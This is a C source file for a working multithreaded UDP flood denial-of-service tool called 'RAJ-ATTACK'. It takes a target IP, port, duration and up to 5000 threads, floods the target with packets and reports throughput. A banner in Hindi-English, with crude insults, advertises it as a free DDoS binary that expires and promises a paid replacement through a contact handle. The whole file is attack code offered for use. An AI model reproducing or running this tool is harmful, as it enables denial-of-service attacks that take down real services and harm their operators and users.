#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_THREADS 5000
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 04
#define EXPIRATION_DAY 28
#define DEFAULT_PACKET_SIZE 64 // Fixed packet size (64 bytes)

int keep_running = 1;
char *global_payload;

// Stats for tracking the progress
unsigned long total_packets_sent = 0;
unsigned long total_bytes_sent = 0;

typedef struct {
    int socket_fd;
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

typedef struct {
    unsigned long pps;
    double gb_sent;
    double mbps;
    unsigned long max_pps;
} stats;

stats current_stats = {0};

// Function prototype declaration
void display_progress(int remaining_time);
void print_banner(int remaining_days, int remaining_hours, int remaining_minutes, int remaining_seconds_int);
void *udp_flood(void *args);
void *stats_thread(void *args);

void print_banner(int remaining_days, int remaining_hours, int remaining_minutes, int remaining_seconds_int) {
    printf("\n");
    printf("\033[1;35m╔═════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║ \033[1;36m██████╗  █████╗  █████╗  ███████╗███████╗████████╗\033[0m\n");
    printf("\033[1;35m║ \033[1;36m██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝\033[0m\n");
    printf("\033[1;35m║ \033[1;36m██████╔╝███████║███████║███████╗   ██║      ██║   \033[0m\n");
    printf("\033[1;35m║ \033[1;36m██╔══██╗██╔══██║██╔══██║╚════██║   ██║      ██║   \033[0m\n");
    printf("\033[1;35m║ \033[1;36m██████╔╝██║  ██║██║  ██║███████║   ██║      ██║   \033[0m\n");
    printf("\033[1;35m║ \033[1;36m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝      ╚═╝   \033[0m\n");
    printf("\033[1;35m║ \033[1;36m            ★ \033[1;32mRAJOWNER90\033[1;36m ★             \033[0m\n");
    printf("\033[1;35m╠═════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ DEVELOPED BY: \033[1;32m@RAJOWNER90 \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ EXPIRY TIME: \033[1;32m%d days, %02d:%02d:%02d \033[1;35m║\033[0m\n", 
           remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);
    printf("\033[1;35m║ \033[1;33m✦ AAGYA TERA BAAP BY: \033[1;32mRAJOWNER \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ YE FULL FREE DDOS BANARY HAI \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;31m✦ ! [ SELL KRNE WALO BAHEN CHUDALO ] \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ YE FILE EXPIRY KE BAAD NEW FILE PAID MILEGA \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ CONTACT: \033[1;32m@RAJOWNER90 \033[1;35m║\033[0m\n");
    printf("\033[1;35m╠═════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;36m★ \033[1;32mP O W E R F U L \033[1;36m★ \033[1;35m║\033[0m\n");
    printf("\033[1;35m╚═════════════════════════════════════════════════════╝\033[0m\n\n");
}

void *udp_flood(void *args) {
    attack_params *params = (attack_params *)args;
    struct sockaddr_in target;
    char buffer[params->packet_size];
    memset(buffer, 0, params->packet_size);

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target.sin_addr);

    time_t start_time = time(NULL);
    time_t attack_end_time = start_time + params->duration;

    while (keep_running && time(NULL) < attack_end_time) {
        if (sendto(params->socket_fd, buffer, params->packet_size, 0, 
                  (struct sockaddr *)&target, sizeof(target)) > 0) {
            __sync_fetch_and_add(&current_stats.pps, 1);
            __sync_fetch_and_add(&total_packets_sent, 1);
            __sync_fetch_and_add(&total_bytes_sent, params->packet_size);
        }
    }
    close(params->socket_fd);
    return NULL;
}

void display_progress(int remaining_time) {
    printf("\033[2K\r"); // Clear line
    printf("\033[1;36mTime Remaining: %02d:%02d | \033[1;34mPackets Sent: %lu | \033[1;35mData Sent: %.2f MB\033[0m",
           remaining_time / 60, remaining_time % 60, 
           total_packets_sent, 
           (double)total_bytes_sent / (1024 * 1024));
    fflush(stdout);
}

void *stats_thread(void *args) {
    int duration = *((int *)args);
    time_t start_time = time(NULL);
    unsigned long last_pps = 0;
    time_t last_time = start_time;

    while (keep_running) {
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        unsigned long current = current_stats.pps;
        
        if (now > last_time) {
            current_stats.mbps = (current - last_pps) * 1024 * 8 / 1000000.0;
            last_pps = current;
            last_time = now;
        }
        
        if (current > current_stats.max_pps) {
            current_stats.max_pps = current;
        }
        
        int remaining_time = duration - (int)elapsed;
        if (remaining_time < 0) remaining_time = 0;
        
        display_progress(remaining_time);
        usleep(200000); // Update every 200ms
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s ip port time threads\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Set expiration date (Hardcoded to April 8, 2025)
    struct tm expiration_time = {0};
    expiration_time.tm_year = EXPIRATION_YEAR - 1900;
    expiration_time.tm_mon = EXPIRATION_MONTH - 1;
    expiration_time.tm_mday = EXPIRATION_DAY;
    expiration_time.tm_hour = 23;
    expiration_time.tm_min = 59;
    expiration_time.tm_sec = 59;
    time_t expiration_timestamp = mktime(&expiration_time);

    time_t now = time(NULL);
    int remaining_seconds = difftime(expiration_timestamp, now);
    int remaining_days = remaining_seconds / 86400;
    remaining_seconds %= 86400;
    int remaining_hours = remaining_seconds / 3600;
    remaining_seconds %= 3600;
    int remaining_minutes = remaining_seconds / 60;
    int remaining_seconds_int = remaining_seconds % 60;

    // Display banner when program starts
    print_banner(remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);

    // Parse command-line arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    int packet_size = DEFAULT_PACKET_SIZE;

    // Validate thread count
    if (thread_count <= 0 || thread_count > MAX_THREADS) {
        printf("\033[1;31m[!] Invalid thread count. Must be between 1 and %d\033[0m\n", MAX_THREADS);
        return EXIT_FAILURE;
    }

    // Declare necessary variables
    pthread_t threads[thread_count];  // Thread array
    pthread_t stats_tid;  // Stats thread
    attack_params params[thread_count]; // Parameters for each thread

    printf("\n\033[1;36m[+] Starting RAJ-ATTACK on %s:%d for %d seconds with %d threads (Packet Size: %d bytes)\033[0m\n", 
           target_ip, target_port, duration, thread_count, packet_size);

    // Create the stats thread
    pthread_create(&stats_tid, NULL, stats_thread, &duration);

    // Create and launch attack threads
    for (int i = 0; i < thread_count; i++) {
        params[i] = (attack_params){
            .target_ip = target_ip,
            .target_port = target_port,
            .duration = duration,
            .packet_size = packet_size,
            .thread_id = i,
            .socket_fd = socket(AF_INET, SOCK_DGRAM, 0)
        };

        if (params[i].socket_fd < 0) {
            perror("\033[1;31m[!] Socket creation failed\033[0m");
            return EXIT_FAILURE;
        }

        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    time_t start_time = time(NULL);
    while (difftime(time(NULL), start_time) < duration) {
        usleep(100000);  // Sleep for 100ms
    }

    // Stop the attack
    keep_running = 0;

    // Wait for all threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    // Wait for stats thread to finish
    pthread_join(stats_tid, NULL);

    // Attack complete summary
    double total_time_taken = difftime(time(NULL), start_time);
    printf("\n\033[1;32mAttack completed.\033[0m\n");
    printf("\033[1;34mTotal time taken:\033[0m \033[1;35m%.2f seconds\033[0m\n", total_time_taken);
    printf("\033[1;34mTotal packets sent:\033[0m \033[1;35m%lu\033[0m\n", total_packets_sent);
    printf("\033[1;34mTotal data sent:\033[0m \033[1;35m%.2f MB\033[0m\n", (double)total_bytes_sent / (1024 * 1024));

    free(global_payload); // Free the shared payload
    return 0;
}